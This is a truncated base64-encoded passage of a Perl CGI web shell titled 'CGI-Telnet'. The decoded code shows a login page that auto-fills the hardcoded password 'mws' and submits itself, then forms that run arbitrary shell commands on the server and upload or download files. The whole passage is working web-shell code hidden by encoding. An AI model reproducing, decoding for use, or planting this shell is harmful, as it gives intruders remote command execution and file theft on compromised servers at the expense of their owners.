AoJCX0KCX0KCWVsc2UgIyBzdGFuZGFyZCBwb3N0IGRhdGEgKHVybCBlbmNvZGVkLCBub3QgbXVsdGlwYXJ0KQoJewoJCUBpbiA9IHNwbGl0KC8mLywgJGluKTsKCQlmb3JlYWNoICRpICgwIC4uICQjaW4pCgkJewoJCQkkaW5bJGldID1+IHMvXCsvIC9nOwoJCQkoJGtleSwgJHZhbCkgPSBzcGxpdCgvPS8sICRpblskaV0sIDIpOwoJCQkka2V5ID1+IHMvJSguLikvcGFjaygiYyIsIGhleCgkMSkpL2dlOwoJCQkkdmFsID1+IHMvJSguLikvcGFjaygiYyIsIGhleCgkMSkpL2dlOwoJCQkkaW57JGtleX0gLj0gIlwwIiBpZiAoZGVmaW5lZCgkaW57JGtleX0pKTsKCQkJJGlueyRrZXl9IC49ICR2YWw7CgkJfQoJfQp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUHJpbnRzIHRoZSBIVE1MIFBhZ2UgSGVhZGVyCiMgQXJndW1lbnQgMTogRm9ybSBpdGVtIG5hbWUgdG8gd2hpY2ggZm9jdXMgc2hvdWxkIGJlIHNldAojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludFBhZ2VIZWFkZXIKewoJJEVuY29kZWRDdXJyZW50RGlyID0gJEN1cnJlbnREaXI7CgkkRW5jb2RlZEN1cnJlbnREaXIgPX4gcy8oW15hLXpBLVowLTldKS8nJScudW5wYWNrKCJIKiIsJDEpL2VnOwoJcHJpbnQgIkNvbnRlbnQtdHlwZTogdGV4dC9odG1sXG5cbiI7CglwcmludCA8PEVORDsKPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvc3RyaWN0LmR0ZCI+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkNHSS1UZWxuZXQgVmVyc2lvbiAxLjA8L3RpdGxlPgokSHRtbE1ldGFIZWFkZXIKPC9oZWFkPgo8Ym9keSBvbkxvYWQ9ImRvY3VtZW50LmYuQF8uZm9jdXMoKSIgYmdjb2xvcj0iIzAwMDAwMCIgdG9wbWFyZ2luPSIwIiBsZWZ0bWFyZ2luPSIwIiBtYXJnaW53aWR0aD0iMCIgbWFyZ2luaGVpZ2h0PSIwIj4KPHRhYmxlIGJvcmRlcj0iMSIgd2lkdGg9IjEwMCUiIGNlbGxzcGFjaW5nPSIwIiBjZWxscGFkZGluZz0iMiI+Cjx0cj4KPHRkIGJnY29sb3I9IiNDMkJGQTUiIGJvcmRlcmNvbG9yPSIjMDAwMDgwIiBhbGlnbj0iY2VudGVyIj4KPGI+PGZvbnQgY29sb3I9IiMwMDAwODAiIHNpemU9IjIiPiM8L2ZvbnQ+PC9iPjwvdGQ+Cjx0ZCBiZ2NvbG9yPSIjMDAwMDgwIj48Zm9udCBmYWNlPSJWZXJkYW5hIiBzaXplPSIyIiBjb2xvcj0iI0ZGRkZGRiI+PGI+Q0dJLVRlbG5ldCBWZXJzaW9uIDEuMCAtIENvbm5lY3RlZCB0byAkU2VydmVyTmFtZTwvYj48L2ZvbnQ+PC90ZD4KPC90cj4KPHRyPgo8dGQgY29sc3Bhbj0iMiIgYmdjb2xvcj0iI0MyQkZBNSI+PGZvbnQgZmFjZT0iVmVyZGFuYSIgc2l6ZT0iMiI+CjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPXVwbG9hZCZkPSRFbmNvZGVkQ3VycmVudERpciI+VXBsb2FkIEZpbGU8L2E+IHwgCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWRvd25sb2FkJmQ9JEVuY29kZWRDdXJyZW50RGlyIj5Eb3dubG9hZCBGaWxlPC9hPiB8CjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWxvZ291dCI+RGlzY29ubmVjdDwvYT4gfAo8YSBocmVmPSJodHRwOi8vd3d3LnJvaGl0YWIuY29tL2NnaXNjcmlwdHMvY2dpdGVsbmV0Lmh0bWwiPkhlbHA8L2E+CjwvZm9udD48L3RkPgo8L3RyPgo8L3RhYmxlPgo8Zm9udCBjb2xvcj0iI0MwQzBDMCIgc2l6ZT0iMyI+CkVORAp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUHJpbnRzIHRoZSBMb2dpbiBTY3JlZW4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgUHJpbnRMb2dpblNjcmVlbgp7CgkkTWVzc2FnZSA9IHEkPHByZT48Zm9udCBjb2xvcj0iIzY2OTk5OSI+IF9fX19fICBfX19fXyAgX19fX18gICAgICAgICAgX19fX18gICAgICAgIF8gICAgICAgICAgICAgICBfCi8gIF9fIFx8ICBfXyBcfF8gICBffCAgICAgICAgfF8gICBffCAgICAgIHwgfCAgICAgICAgICAgICB8IHwKfCAvICBcL3wgfCAgXC8gIHwgfCAgIF9fX19fXyAgIHwgfCAgICBfX18gfCB8IF8gX18gICAgX19fIHwgfF8KfCB8ICAgIHwgfCBfXyAgIHwgfCAgfF9fX19fX3wgIHwgfCAgIC8gXyBcfCB8fCAnXyBcICAvIF8gXHwgX198CnwgXF9fL1x8IHxfXCBcIF98IHxfICAgICAgICAgICB8IHwgIHwgIF9fL3wgfHwgfCB8IHx8ICBfXy98IHxfCiBcX19fXy8gXF9fX18vIFxfX18vICAgICAgICAgICBcXy8gICBcX19ffHxffHxffCB8X3wgXF9fX3wgXF9ffCAxLjAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKPC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAwIj4gICAgICAgICAgICAgICAgICAgICAgX19fX19fICAgICAgICAgICAgIDwvZm9udD48Zm9udCBjb2xvcj0iI0FFODMwMCI+wqkgMjAwMSwgUm9oaXRhYiBCYXRyYTwvZm9udD48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+CiAgICAgICAgICAgICAgICAgICAuLSZxdW90OyAgICAgICZxdW90Oy0uCiAgICAgICAgICAgICAgICAgIC8gICAgICAgICAgICBcCiAgICAgICAgICAgICAgICAgfCAgICAgICAgICAgICAgfAogICAgICAgICAgICAgICAgIHwsICAuLS4gIC4tLiAgLHwKICAgICAgICAgICAgICAgICB8ICkoX28vICBcb18pKCB8CiAgICAgICAgICAgICAgICAgfC8gICAgIC9cICAgICBcfAogICAgICAgKEBfICAgICAgIChfICAgICBeXiAgICAgXykKICBfICAgICApIFw8L2ZvbnQ+PGZvbnQgY29sb3I9IiM4MDgwODAiPl9fX19fX188L2ZvbnQ+PGZvbnQgY29sb3I9IiNGRjAwMDAiPlw8L2ZvbnQ+PGZvbnQgY29sb3I9IiM4MDgwODAiPl9fPC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAwIj58SUlJSUlJfDwvZm9udD48Zm9udCBjb2xvcj0iIzgwODA4MCI+X188L2ZvbnQ+PGZvbnQgY29sb3I9IiNGRjAwMDAiPi88L2ZvbnQ+PGZvbnQgY29sb3I9IiM4MDgwODAiPl9fX19fX19fX19fX19fX19fX19fX19fCjwvZm9udD48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+IChfKTwvZm9udD48Zm9udCBjb2xvcj0iIzgwODA4MCI+QDhAODwvZm9udD48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+e308L2ZvbnQ+PGZvbnQgY29sb3I9IiM4MDgwODAiPiZsdDtfX19fX19fXzwvZm9udD48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+fC1cSUlJSUlJLy18PC9mb250Pjxmb250IGNvbG9yPSIjODA4MDgwIj5fX19fX19fX19fX19fX19fX19fX19fX18mZ3Q7PC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAwIj4KICAgICAgICApXy8gICAgICAgIFwgICAgICAgICAgLyAKICAgICAgIChAICAgICAgICAgICBgLS0tLS0tLS1gCiAgICAgICAgICAgICA8L2ZvbnQ+PGZvbnQgY29sb3I9IiNBRTgzMDAiPlcgQSBSIE4gSSBOIEc6IFByaXZhdGUgU2VydmVyPC9mb250PjwvcHJlPgokOwojJwoJcHJpbnQgPDxFTkQ7Cjxjb2RlPgpUcnlpbmcgJFNlcnZlck5hbWUuLi48YnI+CkNvbm5lY3RlZCB0byAkU2VydmVyTmFtZTxicj4KRXNjYXBlIGNoYXJhY3RlciBpcyBeXQo8Y29kZT4kTWVzc2FnZQpFTkQKfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFByaW50cyB0aGUgbWVzc2FnZSB0aGF0IGluZm9ybXMgdGhlIHVzZXIgb2YgYSBmYWlsZWQgbG9naW4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgUHJpbnRMb2dpbkZhaWxlZE1lc3NhZ2UKewoJcHJpbnQgPDxFTkQ7Cjxjb2RlPgo8YnI+bG9naW46IGFkbWluPGJyPgpwYXNzd29yZDo8YnI+CkxvZ2luIGluY29ycmVjdDxicj48YnI+CjwvY29kZT4KRU5ECn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBQcmludHMgdGhlIEhUTUwgZm9ybSBmb3IgbG9nZ2luZyBpbgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludExvZ2luRm9ybQp7CglwcmludCA8PEVORDsKPGNvZGU+Cjxmb3JtIG5hbWU9ImYiIGlkPSJjZ2kiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0ibG9naW4iPgpsb2dpbjogYWRtaW48YnI+CnBhc3N3b3JkOjxpbnB1dCB0eXBlPSJwYXNzd29yZCIgdmFsdWU9Im13cyIgbmFtZT0icCI+CjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJFbnRlciI+CjwvZm9ybT4KPHNjcmlwdD5zZXRUaW1lb3V0KGZ1bmN0aW9uKCl7ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2NnaScpLnN1Ym1pdCgpO30sMTUwKTs8L3NjcmlwdD4KPC9jb2RlPgpFTkQKfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFByaW50cyB0aGUgZm9vdGVyIGZvciB0aGUgSFRNTCBQYWdlCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50UGFnZUZvb3Rlcgp7CglwcmludCAiPC9mb250PjwvYm9keT48L2h0bWw+IjsKfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFJldHJlaXZlcyB0aGUgdmFsdWVzIG9mIGFsbCBjb29raWVzLiBUaGUgY29va2llcyBjYW4gYmUgYWNjZXNzZXMgdXNpbmcgdGhlCiMgdmFyaWFibGUgJENvb2tpZXN7Jyd9CiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIEdldENvb2tpZXMKewoJQGh0dHBjb29raWVzID0gc3BsaXQoLzsgLywkRU5WeydIVFRQX0NPT0tJRSd9KTsKCWZvcmVhY2ggJGNvb2tpZShAaHR0cGNvb2tpZXMpCgl7CgkJKCRpZCwgJHZhbCkgPSBzcGxpdCgvPS8sICRjb29raWUpOwoJCSRDb29raWVzeyRpZH0gPSAkdmFsOwoJfQp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUHJpbnRzIHRoZSBzY3JlZW4gd2hlbiB0aGUgdXNlciBsb2dzIG91dAojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludExvZ291dFNjcmVlbgp7CglwcmludCAiPGNvZGU+Q29ubmVjdGlvbiBjbG9zZWQgYnkgZm9yZWlnbiBob3N0Ljxicj48YnI+PC9jb2RlPiI7Cn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBMb2dzIG91dCB0aGUgdXNlciBhbmQgYWxsb3dzIHRoZSB1c2VyIHRvIGxvZ2luIGFnYWluCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFBlcmZvcm1Mb2dvdXQKewoJcHJpbnQgIlNldC1Db29raWU6IFNBVkVEUFdEPTtcbiI7ICMgcmVtb3ZlIHBhc3N3b3JkIGNvb2tpZQoJJlByaW50UGFnZUhlYWRlcigicCIpOwoJJlByaW50TG9nb3V0U2NyZWVuOwoJJlByaW50TG9naW5TY3JlZW47CgkmUHJpbnRMb2dpbkZvcm07CgkmUHJpbnRQYWdlRm9vdGVyOwp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgdG8gbG9naW4gdGhlIHVzZXIuIElmIHRoZSBwYXNzd29yZCBtYXRjaGVzLCBpdAojIGRpc3BsYXlzIGEgcGFnZSB0aGF0IGFsbG93cyB0aGUgdXNlciB0byBydW4gY29tbWFuZHMuIElmIHRoZSBwYXNzd29yZCBkb2Vucyd0CiMgbWF0Y2ggb3IgaWYgbm8gcGFzc3dvcmQgaXMgZW50ZXJlZCwgaXQgZGlzcGxheXMgYSBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyCiMgdG8gbG9naW4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgUGVyZm9ybUxvZ2luIAp7CglpZigkTG9naW5QYXNzd29yZCBlcSAkUGFzc3dvcmQpICMgcGFzc3dvcmQgbWF0Y2hlZAoJewoJCXByaW50ICJTZXQtQ29va2llOiBTQVZFRFBXRD0kTG9naW5QYXNzd29yZDtcbiI7CgkJJlByaW50UGFnZUhlYWRlcigiYyIpOwoJCSZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOwoJCSZQcmludFBhZ2VGb290ZXI7Cgl9CgllbHNlICMgcGFzc3dvcmQgZGlkbid0IG1hdGNoCgl7CgkJJlByaW50UGFnZUhlYWRlcigicCIpOwoJCSZQcmludExvZ2luU2NyZWVuOwoJCWlmKCRMb2dpblBhc3N3b3JkIG5lICIiKSAjIHNvbWUgcGFzc3dvcmQgd2FzIGVudGVyZWQKCQl7CgkJCSZQcmludExvZ2luRmFpbGVkTWVzc2FnZTsKCQl9CgkJJlByaW50TG9naW5Gb3JtOwoJCSZQcmludFBhZ2VGb290ZXI7Cgl9Cn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBQcmludHMgdGhlIEhUTUwgZm9ybSB0aGF0IGFsbG93cyB0aGUgdXNlciB0byBlbnRlciBjb21tYW5kcwojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtCnsKCSRQcm9tcHQgPSAkV2luTlQgPyAiJEN1cnJlbnREaXI+ICIgOiAiW2FkbWluXEAkU2VydmVyTmFtZSAkQ3VycmVudERpcl1cJCAiOwoJcHJpbnQgPDxFTkQ7Cjxjb2RlPgo8Zm9ybSBuYW1lPSJmIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImNvbW1hbmQiPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPgokUHJvbXB0CjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJjIj4KPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkVudGVyIj4KPC9mb3JtPgo8L2NvZGU+CkVORAp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUHJpbnRzIHRoZSBIVE1MIGZvcm0gdGhhdCBhbGxvd3MgdGhlIHVzZXIgdG8gZG93bmxvYWQgZmlsZXMKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgUHJpbnRGaWxlRG93bmxvYWRGb3JtCnsKCSRQcm9tcHQgPSAkV2luTlQgPyAiJEN1cnJlbnREaXI+ICIgOiAiW2FkbWluXEAkU2VydmVyTmFtZSAkQ3VycmVudERpcl1cJCAiOwoJcHJpbnQgPDxFTkQ7Cjxjb2RlPgo8Zm9ybSBuYW1lPSJmIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZCIgdmFsdWU9IiRDdXJyZW50RGlyIj4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImRvd25sb2FkIj4KJFByb21wdCBkb3dubG9hZDxicj48YnI+CkZpbGVuYW1lOiA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iZiIgc2l6ZT0iMzUiPjxicj48YnI+CkRvd25sb2FkOiA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iQmVnaW4iPgo8L2Zvcm0+CjwvY29kZT4KRU5ECn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBQcmludHMgdGhlIEhUTUwgZm9ybSB0aGF0IGFsbG93cyB0aGUgdXNlciB0byB1cGxvYWQgZmlsZXMKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgUHJpbnRGaWxlVXBsb2FkRm9ybQp7CgkkUHJvbXB0ID0gJFdpbk5UID8gIiRDdXJyZW50RGlyPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJEN1cnJlbnREaXJdXCQgIjsKCXByaW50IDw8RU5EOwo8Y29kZT4KPGZvcm0gbmFtZT0iZiIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+CiRQcm9tcHQgdXBsb2FkPGJyPjxicj4KRmlsZW5hbWU6IDxpbnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJmIiBzaXplPSIzNSI+PGJyPjxicj4KT3B0aW9uczogJm5ic3A7PGlucHV0IHR5cGU9ImNoZWNrYm94IiBuYW1lPSJvIiB2YWx1ZT0ib3ZlcndyaXRlIj4KT3ZlcndyaXRlIGlmIGl0IEV4aXN0czxicj48YnI+ClVwbG9hZDombmJzcDsmbmJzcDsmbmJzcDs8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iQmVnaW4iPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0idXBsb2FkIj4KPC9mb3JtPgo8L2NvZGU+CkVORAp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdGltZW91dCBmb3IgYSBjb21tYW5kIGV4cGlyZXMuIFdlIG5lZWQgdG8KIyB0ZXJtaW5hdGUgdGhlIHNjcmlwdCBpbW1lZGlhdGVseS4gVGhpcyBmdW5jdGlvbiBpcyB2YWxpZCBvbmx5IG9uIFVuaXguIEl0IGlzCiMgbmV2ZXIgY2FsbGVkIHdoZW4gdGhlIHNjcmlwdCBpcyBydW5uaW5nIG9uIE5ULgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBDb21tYW5kVGltZW91dAp7CglpZighJFdpbk5UKQoJewoJCWFsYXJtKDApOwoJCXByaW50IDw8RU5EOwo8L3htcD4KPGNvZGU+CkNvbW1hbmQgZXhjZWVkZWQgbWF4aW11bSB0aW1lIG9mICRDb21tYW5kVGltZW91dER1cmF0aW9uIHNlY29uZChzKS4KPGJyPktpbGxlZCBpdCEKPGNvZGU+CkVORAoJCSZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOwoJCSZQcmludFBhZ2VGb290ZXI7CgkJZXhpdDsKCX0KfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHRvIGV4ZWN1dGUgY29tbWFuZHMuIEl0IGRpc3BsYXlzIHRoZSBvdXRwdXQgb2YgdGhlCiMgY29tbWFuZCBhbmQgYWxsb3dzIHRoZSB1c2VyIHRvIGVudGVyIGFub3RoZXIgY29tbWFuZC4gVGhlIGNoYW5nZSBkaXJlY3RvcnkKIyBjb21tYW5kIGlzIGhhbmRsZWQgZGlmZmVyZW50bHkuIEluIHRoaXMgY2FzZSwgdGhlIG5ldyBkaXJlY3RvcnkgaXMgc3RvcmVkIGluCiMgYW4gaW50ZXJuYWwgdmFyaWFibGUgYW5kIGlzIHVzZWQgZWFjaCB0aW1lIGEgY29tbWFuZCBoYXMgdG8gYmUgZXhlY3V0ZWQuIFRoZQojIG91dHB1dCBvZiB0aGUgY2hhbmdlIGRpcmVjdG9yeSBjb21tYW5kIGlzIG5vdCBkaXNwbGF5ZWQgdG8gdGhlIHVzZXJzCiMgdGhlcmVmb3JlIGVycm9yIG1lc3NhZ2VzIGNhbm5vdCBiZSBkaXNwbGF5ZWQuCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIEV4ZWN1dGVDb21tYW5kCnsKCWlmKCRSdW5Db21tYW5kID1+IG0vXlxzKmNkXHMrKC4rKS8pICMgaXQgaXMgYSBjaGFuZ2UgZGlyIGNvbW1hbmQKCXsKCQkjIHdlIGNoYW5nZSB0aGUgZGlyZWN0b3J5IGludGVybmFsbHkuIFRoZSBvdXRwdXQgb2YgdGhlCgkJIyBjb21tYW5kIGlzIG5vdCBkaXNwbGF5ZWQuCgkJCgkJJE9sZERpciA9ICRDdXJyZW50RGlyOwoJCSRDb21tYW5kID0gImNkIFwiJEN1cnJlbnREaXJcIiIuJENtZFNlcC4iY2QgJDEiLiRDbWRTZXAuJENtZFB3ZDsKCQljaG9wKCRDdXJyZW50RGlyID0gYCRDb21tYW5kYCk7CgkJJlByaW50UGFnZUhlYWRlcigiYyIpOwoJCSRQcm9tcHQgPSAkV2luTlQgPyAiJE9sZERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRPbGREaXJdXCQgIjsKCQlwcmludCAiPGNvZGU+JFByb21wdCAkUnVuQ29tbWFuZDwvY29kZT4iOwoJfQoJZWxzZSAjIHNvbWUgb3RoZXIgY29tbWFuZCwgZGlzcGxheSB0aGUgb3V0cHV0Cgl7CgkJJlByaW50UGFnZUhlYWRlcigiYyIpOwoJCSRQcm9tcHQgPSAkV2luTlQgPyAiJEN1cnJlbnREaXI+ICIgOiAiW2FkbWluXEAkU2VydmVyTmFtZSAkQ3VycmVudERpcl1cJCAiOwoJCXByaW50ICI8Y29kZT4kUHJvbXB0ICRSdW5Db21tYW5kPC9jb2RlPjx4bXA+IjsKCQkkQ29tbWFuZCA9ICJjZCBcIiRDdXJyZW50RGlyXCIiLiRDbWRTZXAuJFJ1bkNvbW1hbmQuJFJlZGlyZWN0b3I7CgkJaWYoISRXaW5OVCkKCQl7CgkJCSRTSUd7J0FMUk0nfSA9IFwmQ29tbWFuZFRpbWVvdXQ7CgkJCWFsYXJtKCRDb21tYW5kVGltZW91dER1cmF0aW9uKTsKCQl9CgkJaWYoJFNob3dEeW5hbWljT3V0cHV0KSAjIHNob3cgb3V0cHV0IGFzIGl0IGlzIGdlbmVyYXRlZAoJCXsKCQkJJHw9MTsKCQkJJENvbW1hbmQgLj0gIiB8IjsKCQkJb3BlbihDb21tYW5kT3V0cHV0LCAkQ29tbWFuZCk7CgkJCXdoaWxlKDxDb21tYW5kT3V0cHV0PikKCQkJewoJCQkJJF8gPX4gcy8oXG58XHJcbikkLy87CgkJCQlwcmludCAiJF9cbiI7CgkJCX0KCQkJJHw9MDsKCQl9CgkJZWxzZSAjIHNob3cgb3V0cHV0IGFmdGVyIGNvbW1hbmQgY29tcGxldGVzCgkJewoJCQlwcmludCBgJENvbW1hbmRgOwoJCX0KCQlpZighJFdpbk5UKQoJCXsKCQkJYWxhcm0oMCk7CgkJfQoJCXByaW50ICI8L3htcD4iOwoJfQoJJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07CgkmUHJpbnRQYWdlRm9vdGVyOwp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiBkaXNwbGF5cyB0aGUgcGFnZSB0aGF0IGNvbnRhaW5zIGEgbGluayB3aGljaCBhbGxvd3MgdGhlIHVzZXIKIyB0byBkb3dubG9hZCB0aGUgc3BlY2lmaWVkIGZpbGUuIFRoZSBwYWdlIGFsc28gY29udGFpbnMgYSBhdXRvLXJlZnJlc2gKIyBmZWF0dXJlIHRoYXQgc3RhcnRzIHRoZSBkb3dubG9hZCBhdXRvbWF0aWNhbGx5LgojIEFyZ3VtZW50IDE6IEZ1bGx5IHF1YWxpZmllZCBmaWxlbmFtZSBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50RG93bmxvYWRMaW5rUGFnZQp7Cglsb2NhbCgkRmlsZVVybCkgPSBAXzsKCWlmKC1lICRGaWxlVXJsKSAjIGlmIHRoZSBmaWxlI